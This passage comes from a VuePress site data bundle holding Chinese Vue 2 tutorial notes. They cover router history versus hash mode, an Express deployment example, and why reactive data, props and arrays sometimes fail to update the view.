router.aftereach且成功切换到路由，beforerouteleave是离开组件，不一定成功去往了to的组件\n  beforerouteleave(to, from, next) {\n    console.log("to", to);\n    console.log("from", from);\n    next();\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 3.10 history模式和hash模式\n\nvue router默认是hash模式的，路径里会出现/#，它的好处是/#后面的路径在重新加载页面时不会传递给服务器，这样就不会导致请求不到资源而报错。而history模式却是将端口号以后的完整路径传给服务器进行请求，如果请求不到资源就会报错，因为传递过来的其实是前端自己的路由地址，在服务端并没有该地址的接口处理或者没有该地址对应的资源就会报错。\n\nimport vue from \'vue\'\nimport router from \'vue-router\'\nvue.use(router);\n\nconst router = new router({\n    mode: \'history\', // 默认是hash模式，可以改为history模式\n    routes: [...],\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n项目上线一般选择history模式，至于服务端怎么处理就得借助中间件了。我们简单使用express做一下项目上线演示。\n\n * 新建一个服务端项目vue_express_test，然后在该项目里使用npm init初始化项目，然后使用npm i express安装express，再使用npm i connect-history-api-fallback。\n * 在vue_express_test项目的根目录下新建一个static目录和server.js文件，前者用于存放vue项目经过build后的静态文件，后者是用于启动项目。\n * 在前端的vue项目中运行npm run build，会生成一个dist文件夹，将里面的东西全部复制到服务端项目的static里。\n * 准备一下server.js的内容后，在服务器端使用node server.js运行，然后在浏览器里输入localhost:5005就可以查看部署的前端页面了。\n\nserver.js：\n\nconst express = require(\'express\');\nconst history = require(\'connect-history-api-fallback\');\nconst app = express();\n// 解决前端history模式下请求服务器报错的问题\napp.use(history());\n// 指定静态资源\napp.use(express.static(__dirname + \'/static\'));\napp.get(\'preson\', (req, resp) => {\n    resp.send({\n        name: \'张三\',\n        age: 18\n    })\n});\napp.listen(5005, (err) => {\n    if (!err) console.log(\'服务器启动了\');\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 对于一个url来说，什么是hash值？——#及其后面的内容就是hash值。\n 2. hash值不会包含在http请求中，即：hash值不会带给服务器。\n 3. hash模式：\n    1. 地址永远带着#号，不美观。\n    2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。\n    3. 兼容性好。\n 4. history模式：\n    1. 地址干净、美观。\n    2. 兼容性相比于hash模式略差。\n    3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。\n\n----------------------------------------',charsets:{cjk:!0}},{title:"5.vue散记",frontmatter:{title:"5.vue散记"},regularPath:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0Vue/5.vue%E6%95%A3%E8%AE%B0.html",relativePath:"book-web/web前端js框架/学习Vue/5.vue散记.md",key:"v-2d9f0b57",path:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0Vue/5.vue%E6%95%A3%E8%AE%B0.html",headers:[{level:2,title:"深入理解Vue2响应式",slug:"深入理解vue2响应式",normalizedTitle:"深入理解vue2响应式",charIndex:12},{level:3,title:"响应式数据为何不响应",slug:"响应式数据为何不响应",normalizedTitle:"响应式数据为何不响应",charIndex:28},{level:3,title:"props与响应式",slug:"props与响应式",normalizedTitle:"props与响应式",charIndex:3047}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"深入理解Vue2响应式 响应式数据为何不响应 props与响应式",content:'# vue散记\n\n\n# 深入理解Vue2响应式\n\n\n# 响应式数据为何不响应\n\n先看下面的代码，组件在挂载后请求了接口，更改了数据，那视图为何不更新呢？update相关钩子也没有触发。看完代码会有对应的解释。\n\n<template>\n  <div class="outer">\n    <p>this.parentObj数据：</p>\n    <div>a--: {{ parentObj.a }}</div>\n    <div>b--: {{ parentObj.b }}</div>\n    <br />\n    <p>this.parentArr数据：</p>\n    <ul>\n      <li v-for="item in parentArr" :key="item.key">\n        <input v-model="item.value" />\n      </li>\n    </ul>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "App",\n  data() {\n    console.log("父组件初始化data");\n    return { parentObj: {}, parentArr: [] };\n  },\n  beforeMount() {\n    console.log("父组件开始挂载");\n  },\n  mounted() {\n    console.log("父组件挂载了");\n    // 模拟接口请求\n    console.log("父组件在mounted里面的接口开始请求");\n    setTimeout(() => {\n      console.log("父组件在mounted里面的接口请求成功");\n      this.parentObj.a = "a";\n      this.parentObj.b = "b";\n      this.parentArr[0] = { key: "c", value: "c" };\n      this.parentArr[1] = { key: "d", value: "d" };\n    }, 3000);\n  },\n  beforeUpdate() {\n    console.log("父组件准备更新");\n  },\n  updated() {\n    console.log("父组件更新了");\n  }\n};\n<\/script>\n\n<style scoped>\n.outer {\n  padding: 10px;\n  background-color: dimgray;\n}\n</style>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n\n\n如果有读过前面写的1.vue基础里的第七章内容Vue的数据监视，就会知道上面例子不更新视图的原因了。下面就简单说一下。\n\n在执行组件构造函数时（初始化时），会对传进来的option配置项（data、props、methods等）进行“解读”，其中将data和props就使用了Object.defineProperty()做成了响应式数据。响应式数据，我们常用的简单类型就不用说了，这里要说的就是上面例子中的对象和数组（特殊对象）。\n\nvue会遍历（深层次的是递归）对象的属性，将它的属性使用Object.defineProperty()里的getter和setter，也就是在访问或修改对象的属性时就会“响应”。\n\n至于数组，它是比较特殊的、聚合式的对象。vue对数组每一项这项本身不会做成响应式，但是这项如果是个对象，就会对这个对象的属性使用Object.defineProperty()做成了响应式的；那数组每项本身怎么办呢？每一项都是带了下标索引的，vue对数组的一些操作方法“动了手脚”，例如push()、pop()、shift()、unshift()、splice()、sort()、reverse()方法在被人使用时会“响应式”。\n\n说到这里，你就应该明白Object.defineProperty()一直是围绕着对象的属性来实现响应式的。那么，对象和数组如果作为了另一个响应式对象的属性，那么这个对象和数组就是响应式的（注意，数组某索引位置上的对象不是这种情况）。data()的return的对象就是，比如上面那个例子，parentObj和parentArr就是作为data() {return {}}的return的对象的属性（叫做根级响应式property），那么parentObj和parentArr本身是响应式的。\n\n上面的文字要仔细思考和理解。那我们改下代码，让组件的视图可以进行更新。数组parentArr的可以改成this.parentArr.push({ key:"c", value: "c" })，属于那8中方式之一，效果如下。\n\n\n\n数组parentArr的还可以改成this.parentArr = [{ key:"c", value: "c" }, { key:"d", value: "d" }]。这种刚刚也讲了，parentArr本身是data里return的对象的属性（根级响应式property），效果如下。\n\n\n\n对象parentObj的改法，this.parentObj={a:\'a\',b:\'b\'}，它受限于data()里定义时的情况，给它声明了属性就可以更改该属性进行视图重新渲染，你一个属性都没设置那目前就只能替换整个对象（接下来会说额外加响应式属性），效果如下。\n\n\n\n最后要说的一点就是，对象在组件初始化时（执行构造函数），没有预先设置属性（像上面的parentObj在最初一个属性都没有），我现在突然想加上新的响应式属性要怎么做？如果你是想加根级响应式property，这个是不允许的，只能在data()里提前定义（声明）好根级响应式property。如果你想加在一个已存在的响应式对象上，那么可以使用Vue.set或者vm.$set（修改已有的也行）。\n\n\n\n对于数组，Vue.set或者vm.$set可以为它添加或修改某索引上的那项，如果那项是个对象，那么会将该对象的属性做成一个响应式的。但是，那项本身不是响应式的，例如this.parentArr[0] = { key: "e", value: "e" }这样的还是不行。\n\n\n\n最后的最后再啰嗦一遍，Object.defineProperty()是围绕对象的属性实现响应式的，这是在组件初始化时做的（组件构造函数只会最初执行一次）。后面没有通过vue提供的方法来加的属性是没有响应式，没有响应式！没有响应式！如果要加（修改值不算），就一定得通过Vue提供的方法（你想无中生有，不可能！得补票！）。所以，要么你在data/props里声明好对象有哪些属性，要么后面自己用Vue.set或者vm.$set来补（切记不能加根级响应式property）！\n\n\n# props与响应式\n\n我们经常对组件进行拆分，然后使用prop进行传参，子组件用props进行接收。子组件的props也会像data一样做成响应式数据。只是props是不允许修改的，我们经常将props赋给data里的数据。来看一些问题。\n\n# 模板要怎样才重新渲染\n\n<template>\n  <div class="outer">\n    <p>this.parentObj数据：</p>\n    <div>a--: {{ parentObj.a }}</div>\n    <div>b--: {{ parentObj.b }}</div>\n    <br />\n    <p>this.parentArr数据：</p>\n    <ul>\n      <li v-for="item in parentArr" :key="item.key">\n        <input v-model="item.value" />\n      </li>\n    </ul>\n    <Inner :childObj="childObj" :childArr="childArr" />\n    \x3c!-- <Inner /> --\x3e\n  </div>\n</template>\n\n<script>\nimport Inner from "./components/Inner.vue";\nexport default {\n  name: "App",\n  components: { Inner },\n  data() {\n    console.log("父组件初始化data");\n    return {\n      parentObj: { a: "a", b: "b" },\n      parentArr: [\n        { key: "c", value: "c" },\n        { key: "d", value: "d" }\n      ],\n      childObj: {},\n      childArr: []\n    };\n  },\n  beforeMount() {\n    console.log("父组件开始挂载");\n  },\n  mounted() {\n    console.log("父组件挂载了");\n    // 模拟接口请求\n    console.log("父组件在mounted里面的接口开始请求");\n    setTimeout(() => {\n      console.log("父组件在mounted里面的接口请求成功");\n      this.childObj = { e: "e", f: "f" };\n      this.childArr = [\n        { key: "g", value: "g" },\n        { key: "h", value: "h" }\n      ];\n    }, 3000);\n  },\n  beforeUpdate() {\n    console.log("父组件准备更新");\n  },\n  updated() {\n    console.log("父组件更新了");\n  }\n};\n<\/script>\n\n<style scoped>\n.outer {\n  padding: 10px;\n  background-color: dimgray;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n<template>\n  <div class="inner">模板没有使用props和data</div>\n</template>\n\n<script>\nexport default {\n  name: "Inner",\n  props: ["childObj", "childArr"],\n  data() {\n    console.log("子组件初始化data");\n    return { myChildObj: {}, myChildArr: [] };\n  },\n  watch: {\n    childObj: {\n      handler(newValue, oldValue) {\n        console.log(\n          "子组件watch childObj：新值newValue是",\n          newValue,\n          "旧值oldValue是",\n          oldValue\n        );\n      }\n    },\n    childArr: {\n      handler(newValue, oldValue) {\n        console.log(\n          "子组件watch childArr：新值newValue是",\n          newValue,\n          "旧值oldValue是",\n          oldValue\n        );\n      }\n    }\n  },\n  beforeMount() {\n    console.log("子组件开始挂载");\n  },\n  mounted() {\n    console.log("子组件挂载了");\n  },\n  beforeUpdate() {\n    console.log("子组件准备更新");\n  },\n  updated() {\n    console.log("子组件更新了");\n  }\n};\n<\/script>\n\n<style>\n.inner {\n  padding: 20px;\n  margin: 20px;\n  background-color: forestgreen;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n\n\n我们会发现，在接口请求后，数据发生了改变，父组件进行了重新渲染，而子组件并没有，效果图如下。\n\n\n\n这是因为组件的重新渲染，是template里用的数据发生变化时，才会重新渲染，否则是不会进行重新渲染的（当然，响应式数据变了会“通知”组件去重新解析模板，至于页面重不重新渲染是元素diff比较结果而决定的）。像上面的例子，父组件的<Inner />处就因为childObj和childArr的数据变化而导致重新渲染，如果此时去掉这两个，那么父组件在mounted后就不会引起视图重新渲染了。子组件更加明显，它的template根本就没有用到任何数据，就更不用谈重新渲染视图了。\n\n# props数据变了但页面未变\n\n上面这个都是小问题。如果将props赋给data里的属性，会怎样？看下面的代码。\n\n<template>\n  <div class="outer">\n    <p>this.parentObj数据：</p>\n    <div>a--: {{ parentObj.a }}</div>\n    <div>b--: {{ parentObj.b }}</div>\n    <p>this.parentArr数据：</p>\n    <ul>\n      <li v-for="item in parentArr" :key="item.key">\n        <input v-model="item.value" />\n      </li>\n    </ul>\n    <Inner :childObj="childObj" :childArr="childArr" />\n  </div>\n</template>\n\n<script>\nimport Inner from "./components/Inner.vue";\nexport default {\n  name: "App",\n  components: { Inner },\n  data() {\n    console.log("父组件初始化data");\n    return {\n      parentObj: { a: "a", b: "b" },\n      parentArr: [\n        { key: "c", value: "c" },\n        { key: "d", value: "d" }\n      ],\n      childObj: {},\n      childArr: []\n    };\n  },\n  beforeMount() {\n    console.log("父组件开始挂载");\n  },\n  mounted() {\n    console.log("父组件挂载了");\n    // 模拟接口请求\n    console.log("父组件在mounted里面的接口开始请求");\n    setTimeout(() => {\n      console.log("父组件在mounted里面的接口请求成功");\n      this.childObj = { e: "e", f: "f" };\n      /* this.$set(this.childObj, "e", "e");\n      this.$set(this.childObj, "f", "f"); */\n    }, 3000);\n  },\n  beforeUpdate() {\n    console.log("父组件准备更新");\n  },\n  updated() {\n    console.log("父组件更新了");\n  }\n};\n<\/script>\n<style scoped>\n.outer {\n  padding: 5px;\n  background-color: dimgray;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n<template>\n  <div class="inner">\n    <ul>\n      <li v-for="item in myChildObj.childObj" :key="item">{{ item }}</li>\n    </ul>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Inner",\n  props: ["childObj", "childArr"],\n  data() {\n    console.log("子组件初始化data");\n    return { myChildObj: { childObj: this.childObj }, myChildArr: [] };\n  },\n  beforeMount() {\n    console.log("子组件开始挂载");\n  },\n  mounted() {\n    console.log("子组件挂载了");\n  },\n  beforeUpdate() {\n    console.log("子组件准备更新");\n  },\n  updated() {\n    console.log("子组件更新了");\n  }\n};\n<\/script>\n<style>\n.inner {\n  padding: 20px;\n  margin: 20px;\n  background-color: forestgreen;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n我们会发现，在接口请求后，数据发生了改变，父组件进行了重新渲染，而子组件并没有，效果图如下。\n\n\n\n这是因为myChildObj.childObj一直都是{}空字面量对象，即使myChildObj和childObj本身被做成了响应式属性，但这又如何？父组件的mounted中改了childObj的地址值（引用），让它指向一个新对象；在子组件中，props中的childObj也会随着父组件变化，它也指向了一个新对象（因为直接将childObj的新引用传进来了）；那么子组件的data里的myChildObj.childObj也会指向新对象吗？\n\n当然不会，它们之间只是初始化时在data(){}中进行了一个“地址值”（引用）的复制，对象中的:就是赋值，对象引用赋给了myChildObj.childObj。总的来说，子组件的props的this.childObj指向的对象已经变了，而data的this.myChildObj.childObj还是指向的是老对象，子组件的template里用的数据是this.myChildObj.childObj而不是this.childObj，所以子组件不会重新渲染。\n\n# 怎样修改前面的代码\n\n那么怎样更改呢？将父组件代码中的this.childObj = { e: "e", f: "f" }进行注释，它下面的两行代码的注释放开即可。也就是加了this.$set(this.childObj, "e", "e")和this.$set(this.childObj, "f", "f")，看过上一小节就知道childObj在父组件初始化时没有e和f两个响应式属性，所以mounted后要加上两个新响应式属性就得用this.$set。只要不是更改父组件的childObj的引用，那么父组件childObj和子组件的props的childObj以及data的myChildObj.childObj就会指向同一个对象，对象添加新响应式属性也就是响应式数据变化了，那么父组件和子组件都会进行重新渲染。效果图如下。\n\n\n\n还有另一种改法，在子组件了监听childObj的变化，一旦它变了，就将它重新赋值给myChildObj.childObj。并由于myChildObj.childObj是个响应式属性，它变了就能引起子组件重新渲染。效果图如下。\n\n\n\n# prop传数组是同样的问题\n\n经常会遇到，在父组件请求接口得到数据，经过简单处理后，截取其中的数组类型的表格数据，将该数据通过prop传递给子组件。然后这个表格还会包含有Input控件，也就是说数据模型是个表单数据。例如this.form.list，这个list实际是通过prop传过来的。\n\n它遇到的问题可能和上一小节差不多。出现问题的原因可能是处理接口响应时，中途没有一条一条push进父组件的this.list，而是在最后处理完直接this.list = list。list引用对象被替换成新的了，子组件还是用的旧的，这就导致子组件表格渲染不出来。push可以解决，this.$set(this.list, index, obj)也能解决，在子组件写watch也能解决。\n\n<template>\n  <div class="outer">\n    我是父组件：父组件暂时不显示相关数据\n    <Inner :childObj="childObj" :childArr="childArr" />\n  </div>\n</template>\n\n<script>\nimport Inner from "./components/Inner.vue";\nexport default {\n  name: "App",\n  components: { Inner },\n  data() {\n    console.log("父组件初始化data");\n    return {\n      childObj: {},\n      childArr: []\n    };\n  },\n  beforeMount() {\n    console.log("父组件开始挂载");\n  },\n  mounted() {\n    console.log("父组件挂载了");\n    // 模拟接口请求\n    console.log("父组件在mounted里面的接口开始请求");\n    setTimeout(() => {\n      console.log("父组件在mounted里面的接口请求成功");\n      this.childArr.push({ key: "a", value: "a" });\n      this.childArr.push({ key: "b", value: "b" });\n      /* this.$set(this.childArr, 0, { key: "a", value: "a" });\n      this.$set(this.childArr, 1, { key: "b", value: "b" }); */\n    }, 3000);\n  },\n  beforeUpdate() {\n    console.log("父组件准备更新");\n  },\n  updated() {\n    console.log("父组件更新了");\n  }\n};\n<\/script>\n\n<style scoped>\n.outer {\n  padding: 5px;\n  background-color: dimgray;\n}\n</style>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n<template>\n  <div class="inner">\n    <ul>\n      <li v-for="item in myChildObj.childArr" :key="item.key">\n        <input v-model="item.value" /> | {{ item.value }}\n      </li>\n    </ul>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Inner",\n  props: ["childObj", "childArr"],\n  data() {\n    console.log("子组件初始化data");\n    return {\n      myChildObj: {\n        childArr: this.childArr\n      },\n      myChildArr: []\n    };\n  },\n  beforeMount() {\n    console.log("子组件开始挂载");\n  },\n  mounted() {\n    console.log("子组件挂载了");\n  },\n  beforeUpdate() {\n    console.log("子组件准备更新");\n  },\n  updated() {\n    console.log("子组件更新了");\n  }\n};\n<\/script>\n\n<style>\n.inner {\n  padding: 20px;\n  margin: 20px;\n  background-color: forestgreen;\n}\n</style>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n\n如果这个子组件是个弹窗dialog，在没有真正保存到服务器时，这个数组类型的表格数据还要有最原始的一份（或者将数据还原）。其实和上面一样，只是多了将数组复制一份（例如concat等）这个步骤，将原始数据和正在操作的数据分隔即可。用props方式，如果在父组件里复制list再传进去，那么会在data有两个类似的list；要是在传到子组件里再复制，它可能通过props能修改对象的bug就你的原始list弄乱（props原则上是不允许修改的）。那么最好还是在父组件复制了再传进去。如果你实在不想在父组件里多处一个“正操作”的list，那么可以考虑使用EventBus全局事件总线。\n\n如果子组件不是弹窗而改用EventBus那就有点没必要了，孙组件或者兄弟组件可以用EventBus；如果是自上而下传方法，可以考虑provide/inject；如果是小范围组件的数据共享，可以考虑使用Vue.observable( object )，它是小型的Vuex。',normalizedContent:'# vue散记\n\n\n# 深入理解vue2响应式\n\n\n# 响应式数据为何不响应\n\n先看下面的代码，组件在挂载后请求了接口，更改了数据，那视图为何不更新呢？update相关钩子也没有触发。看完代码会有对应的解释。\n\n<template>\n  <div class="outer">\n    <p>this.parentobj数据：</p>\n    <div>a--: {{ parentobj.a }}</div>\n    <div>b--: {{ parentobj.b }}</div>\n    <br />\n    <p>this.parentarr数据：</p>\n    <ul>\n      <li v-for="item in parentarr" :key="item.key">\n        <input v-model="item.value" />\n      </li>\n    </ul>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "app",\n  data() {\n    console.log("父组件初始化data");\n    return { parentobj: {}, parentarr: [] };\n  },\n  beforemount() {\n    console.log("父组件开始挂载");\n  },\n  mounted() {\n    console.log("父组件挂载了");\n    // 模拟接口请求\n    console.log("父组件在mounted里面的接口开始请求");\n    settimeout(() => {\n      console.log("父组件在mounted里面的接口请求成功");\n      this.parentobj.a = "a";\n      this.parentobj.b = "b";\n      this.parentarr[0] = { key: "c", value: "c" };\n      this.parentarr[1] = { key: "d", value: "d" };\n    }, 3000);\n  },\n  beforeupdate() {\n    console.log("父组件准备更新");\n  },\n  updated() {\n    console.log("父组件更新了");\n  }\n};\n<\/script>\n\n<style scoped>\n.outer {\n  padding: 10px;\n  background-color: dimgray;\n}\n</style>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n\n\n如果有读过前面写的1.vue基础里的第七章内容vue的数据监视，就会知道上面例子不更新视图的原因了。下面就简单说一下。\n\n在执行组件构造函数时（初始化时），会对传进来的option配置项（data、props、methods等）进行“解读”，其中将data和props就使用了object.defineproperty()做成了响应式数据。响应式数据，我们常用的简单类型就不用说了，这里要说的就是上面例子中的对象和数组（特殊对象）。\n\nvue会遍历（深层次的是递归）对象的属性，将它的属性使用object.defineproperty()里的getter和setter，也就是在访问或修改对象的属性时就会“响应”。\n\n至于数组，它是比较特殊的、聚合式的对象。vue对数组每一项这项本身不会做成响应式，但是这项如果是个对象，就会对这个对象的属性使用object.defineproperty()做成了响应式的；那数组每项本身怎么办呢？每一项都是带了下标索引的，vue对数组的一些操作方法“动了手脚”，例如push()、pop()、shift()、unshift()、splice()、sort()、reverse()方法在被人使用时会“响应式”。\n\n说到这里，你就应该明白object.defineproperty()一直是围绕着对象的属性来实现响应式的。那么，对象和数组如果作为了另一个响应式对象的属性，那么这个对象和数组就是响应式的（注意，数组某索引位置上的对象不是这种情况）。data()的return的对象就是，比如上面那个例子，parentobj和parentarr就是作为data() {return {}}的return的对象的属性（叫做根级响应式property），那么parentobj和parentarr本身是响应式的。\n\n上面的文字要仔细思考和理解。那我们改下代码，让组件的视图可以进行更新。数组parentarr的可以改成this.parentarr.push({ key:"c", value: "c" })，属于那8中方式之一，效果如下。\n\n\n\n数组parentarr的还可以改成this.parentarr = [{ key:"c", value: "c" }, { key:"d", value: "d" }]。这种刚刚也讲了，parentarr本身是data里return的对象的属性（根级响应式property），效果如下。\n\n\n\n对象parentobj的改法，this.parentobj={a:\'a\',b:\'b\'}，它受限于data()里定义时的情况，给它声明了属性就可以更改该属性进行视图重新渲染，你一个属性都没设置那目前就只能替换整个对象（接下来会说额外加响应式属性），效果如下。\n\n\n\n最后要说的一点就是，对象在组件初始化时（执行构造函数），没有预先设置属性（像上面的parentobj在最初一个属性都没有），我现在突然想加上新的响应式属性要怎么做？如果你是想加根级响应式property，这个是不允许的，只能在data()里提前定义（声明）好根级响应式property。如果你想加在一个已存在的响应式对象上，那么可以使用vue.set或者vm.$set（修改已有的也行）。\n\n\n\n对于数组，vue.set或者vm.$set可以为它添加或修改某索引上的那项，如果那项是个对象，那么会将该对象的属性做成一个响应式的。但是，那项本身不是响应式的，例如this.parentarr[0] = { key: "e", value: "e" }这样的还是不行。\n\n\n\n最后的最后再啰嗦一遍，object.defineproperty()是围绕对象的属性实现响应式的，这是在组件初始化时做的（组件构造函数只会最初执行一次）。后面没有通过vue提供的方法来加的属性是没有响应式，没有响应式！没有响应式！如果要加（修改值不算），就一定得通过vue提供的方法（你想无中生有，不可能！得补票！）。所以，要么你在data/props里声明好对象有哪些属性，要么后面自己用vue.set或者vm.$set来补（切记不能加根级响应式property）！\n\n\n# props与响应式\n\n我们经常对组件进行拆分，然后使用prop进行传参，子组件用props进行接收。子组件的props也会像data一样做成响应式数据。只是props是不允许修改的，我们经常将props赋给data里的数据。来看一些问题。\n\n# 模板要怎样才重新渲染\n\n<template>\n  <div class="outer">\n    <p>this.parentobj数据：</p>\n    <div>a--: {{ parentobj.a }}</div>\n    <div>b--: {{ parentobj.b }}</div>\n    <br />\n    <p>this.parentarr数据：</p>\n    <ul>\n      <li v-for="item in parentarr" :key="item.key">\n        <input v-model="item.value" />\n      </li>\n    </ul>\n    <inner :childobj="childobj" :childarr="childarr" />\n    \x3c!-- <inner /> --\x3e\n  </div>\n</template>\n\n<script>\nimport inner from "./components/inner.vue";\nexport default {\n  name: "app",\n  components: { inner },\n  data() {\n    console.log("父组件初始化data");\n    return {\n      parentobj: { a: "a", b: "b" },\n      parentarr: [\n        { key: "c", value: "c" },\n        { key: "d", value: "d" }\n      ],\n      childobj: {},\n      childarr: []\n    };\n  },\n  beforemount() {\n    console.log("父组件开始挂载");\n  },\n  mounted() {\n    console.log("父组件挂载了");\n    // 模拟接口请求\n    console.log("父组件在mounted里面的接口开始请求");\n    settimeout(() => {\n      console.log("父组件在mounted里面的接口请求成功");\n      this.childobj = { e: "e", f: "f" };\n      this.childarr = [\n        { key: "g", value: "g" },\n        { key: "h", value: "h" }\n      ];\n    }, 3000);\n  },\n  beforeupdate() {\n    console.log("父组件准备更新");\n  },\n  updated() {\n    console.log("父组件更新了");\n  }\n};\n<\/script>\n\n<style scoped>\n.outer {\n  padding: 10px;\n  background-color: dimgray;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n<template>\n  <div class="inner">模板没有使用props和data</div>\n</template>\n\n<script>\nexport default {\n  name: "inner",\n  props: ["childobj", "childarr"],\n  data() {\n    console.log("子组件初始化data");\n    return { mychildobj: {}, mychildarr: [] };\n  },\n  watch: {\n    childobj: {\n      handler(newvalue, oldvalue) {\n        console.log(\n          "子组件watch childobj：新值newvalue是",\n          newvalue,\n          "旧值oldvalue是",\n          oldvalue\n        );\n      }\n    },\n    childarr: {\n      handler(newvalue, oldvalue) {\n        console.log(\n          "子组件watch childarr：新值newvalue是",\n          newvalue,\n          "旧值oldvalue是",\n          oldvalue\n        );\n      }\n    }\n  },\n  beforemount() {\n    console.log("子组件开始挂载");\n  },\n  mounted() {\n    console.log("子组件挂载了");\n  },\n  beforeupdate() {\n    console.log("子组件准备更新");\n  },\n  updated() {\n    console.log("子组件更新了");\n  }\n};\n<\/script>\n\n<style>\n.inner {\n  padding: 20px;\n  margin: 20px;\n  background-color: forestgreen;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n\n\n我们会发现，在接口请求后，数据发生了改变，父组件进行了重新渲染，而子组件并没有，效果图如下。\n\n\n\n这是因为组件的重新渲染，是template里用的数据发生变化时，才会重新渲染，否则是不会进行重新渲染的（当然，响应式数据变了会“通知”组件去重新解析模板，至于页面重不重新渲染是元素diff比较结果而决定的）。像上面的例子，父组件的<inner />处就因为childobj和childarr的数据变化而导致重新渲染，如果此时去掉这两个，那么父组件在mounted后就不会引起视图重新渲染了。子组件更加明显，它的template根本就没有用到任何数据，就更不用谈重新渲染视图了。\n\n# props数据变了但页面未变\n\n上面这个都是小问题。如果将props赋给data里的属性，会怎样？看下面的代码。\n\n<template>\n  <div class="outer">\n    <p>this.parentobj数据：</p>\n    <div>a--: {{ parentobj.a }}</div>\n    <div>b--: {{ parentobj.b }}</div>\n    <p>this.parentarr数据：</p>\n    <ul>\n      <li v-for="item in parentarr" :key="item.key">\n        <input v-model="item.value" />\n      </li>\n    </ul>\n    <inner :childobj="childobj" :childarr="childarr" />\n  </div>\n</template>\n\n<script>\nimport inner from "./components/inner.vue";\nexport default {\n  name: "app",\n  components: { inner },\n  data() {\n    console.log("父组件初始化data");\n    return {\n      parentobj: { a: "a", b: "b" },\n      parentarr: [\n        { key: "c", value: "c" },\n        { key: "d", value: "d" }\n      ],\n      childobj: {},\n      childarr: []\n    };\n  },\n  beforemount() {\n    console.log("父组件开始挂载");\n  },\n  mounted() {\n    console.log("父组件挂载了");\n    // 模拟接口请求\n    console.log("父组件在mounted里面的接口开始请求");\n    settimeout(() => {\n      console.log("父组件在mounted里面的接口请求成功");\n      this.childobj = { e: "e", f: "f" };\n      /* this.$set(this.childobj, "e", "e");\n      this.$set(this.childobj, "f", "f"); */\n    }, 3000);\n  },\n  beforeupdate() {\n    